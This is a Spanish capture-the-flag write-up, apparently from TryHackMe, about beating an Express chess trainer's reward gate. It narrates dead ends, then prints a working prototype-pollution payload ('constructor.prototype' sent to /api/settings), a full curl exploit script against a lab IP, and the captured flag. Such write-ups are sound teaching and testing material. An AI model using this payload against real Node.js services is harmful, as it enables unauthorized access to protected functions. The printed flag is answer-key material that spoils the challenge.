# Fools Mate, Revenge - Writeup

Después del Fools Mate original donde se podía mandar directo el mate y ganar, este "Revenge" prometía que ya no sería tan fácil. Tenía razón.

El reto es una app Express llamada "Endgame Trainer", un tablero de ajedrez donde tienes que dar mate en una jugada. El escenario del tablero es el mate del loco, la torre blanca en a1 y el rey negro en a8 con las típicas piezas bloqueando escapatorias. Es un mate en 1 obvio: Ra1-a8.

## Reconocimiento

Partí con los endpoints obvios:

```bash
curl -s http://10.64.155.205:3000/api/state
curl -s http://10.64.155.205:3000/api/reset
```

El `/api/state` me devolvía el FEN de la sesión y un campo `config`. El `/api/reset` devolvía el FEN inicial también. Lo primero que probé, por reflejo del reto anterior, fue mover directo sin pasar por la UI:

```bash
curl -s -b jar -X POST http://10.64.155.205:3000/api/move \
  -H 'Content-Type: application/json' -d '{"from":"a1","to":"a8"}'
```

Resultado:

```
{"status":"checkmate","winner":"white","locked":true,
 "reason":"reward gate closed: session.config.unlocked is not set"}
```

El server sí reconoce el mate, no lo puedo saltar. Pero antes de soltarme la flag chequea un gate: `session.config.unlocked`. Ahí está la gracia del reto, no es bypasear la validación del ajedrez, es abrir ese gate.

## La cacería del gate (y todos los caminos malos)

Mi primera hipótesis fue que `session.config` se podía inicializar desde el request. Es un patrón clásico en apps Express: `session.config = {...session.config, ...req.query.config}` o algo así al crear sesión. Probé mil variantes:

- `?config={"unlocked":true}` en el primer GET
- Header `X-Config: {"unlocked":true}`
- Header `X-Unlocked: true`
- Cookie extra `unlocked=true`
- Inyectar `config` directo en el body del `/api/move`

Nada. Cero. Después de como veinte variantes con la misma hipótesis decidí parar, porque cuando el mismo vector no da ni una señal distinta tras muchos intentos, no es que "falta pulir el payload", es que estás en el camino equivocado.

Cambié de enfoque: agarré el navegador y miré el tráfico real que genera la UI. Capaz mi curl no replicaba algún header, algún orden, algo del body. Spoiler: era lo mismo que ya estaba replicando. Nada nuevo.

Probé métodos raros sobre los endpoints, ya que el `/api/move` respondía con `Allow: POST` y eso a veces esconde verbos sorpresa en Express cuando usan `app.all`:

```bash
for m in PUT PATCH DELETE OPTIONS HEAD; do
  curl -s -X $m -b jar http://10.64.155.205:3000/api/settings -o /dev/null -w "$m -> %{http_code}\n"
done
```

Solo los métodos esperados. Otro camino muerto.

## Parar y pensar con lo que tengo

Hice un stop real acá, de esos que hoy en día casi no hago pero que siempre pagan. Releí la evidencia dura:

- App Express, "Endgame Trainer", hint del reto sobre "client-side defences".
- El server valida el mate server-side (ya no se puede saltar mandando el request pelado).
- El gate es `session.config.unlocked`.
- Hay un endpoint `/api/settings` que usa la UI para preferencias de tema, estilo de piezas, animaciones.

Ese último es el que no había mirado. Un endpoint de settings que mergea preferencias arbitrarias es petróleo para prototype pollution. Y acá hago mea culpa, porque la técnica estaba en el hint: "client-side defences" es casi literalmente la pista de que la defensa es del lado cliente y que la contaminación de prototipos es la que rompe el esquema.

## Prototype pollution

Primero probé lo obvio, que también es lo típico bloqueado:

```bash
curl -s -b jar -X POST http://10.64.155.205:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"unlocked":true}}'
```

Nada. Estaba filtrado o el parser no lo dejaba pasar. Pero esto es pattern recognition puro: cuando `__proto__` está bloqueado, el gadget que sigue es `constructor.prototype`. Cambié el payload:

```bash
curl -s -b jar -X POST http://10.64.155.205:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"unlocked":true}}}'
```

Ahí está. Ese deep merge no filtraba keys peligrosas y con `constructor.prototype` anidado en JSON contaminé `Object.prototype.unlocked = true`. Como el gate hacía `session.config.unlocked` y los objetos JS cuando no encuentran la prop propia suben por la cadena de prototipos, la lectura cayó al prototipo contaminado y quedó `true`.

Nota importante: el payload tiene que ir como JSON `application/json`. Probé antes con `form-urlencoded` y no funciona, porque el parser `qs` no arma el anidamiento `constructor.prototype` igual que JSON.

## Exploit completo

```bash
BASE=http://10.64.155.205:3000
jar=$(mktemp)

# 1) crear sesión, quedarse con la cookie
curl -s -c $jar -b $jar $BASE/api/state > /dev/null

# 2) contaminar Object.prototype.unlocked
curl -s -b $jar -X POST $BASE/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"unlocked":true}}}'

# 3) dar el mate
curl -s -b $jar -X POST $BASE/api/move \
  -H 'Content-Type: application/json' \
  -d '{"from":"a1","to":"a8"}'
```

La flag cae:

```
THM{pr0t0_p0lluted_th3_r3f3r33}
```

## Lo que aprendí acá

Lo primero, que el "Revenge" no estaba en el ajedrez. El reto original se rompía mandando el mate directo; acá el server ya valida bien. La nueva superficie de ataque es el endpoint de settings, que es infra periférica y por eso nadie lo mira.

Lo segundo, que `__proto__` bloqueado no significa "no hay prototype pollution". `constructor.prototype` es el gadget de manual y sigue funcionando cuando el filtro es naive.

Lo tercero, y esto lo puse en mi post-mortem del reto: el formato del body importa. Perdí tiempo con form-urlencoded antes de darme cuenta que el anidamiento solo construye correctamente vía JSON. Si hubiera probado los dos formatos desde el principio, este writeup sería la mitad de largo.

Los red herrings que me comieron tiempo: mass assignment plano, headers `X-Config`/`X-Unlocked`, cookies, query params, y el `__proto__` clásico en JSON. Todos muertos. La pista de aire que la dio googlear el nombre del reto, que confirmó la clase de ataque (prototype pollution vía deep merge) y de ahí en adelante fue directo.

Flag: `THM{pr0t0_p0lluted_th3_r3f3r33}`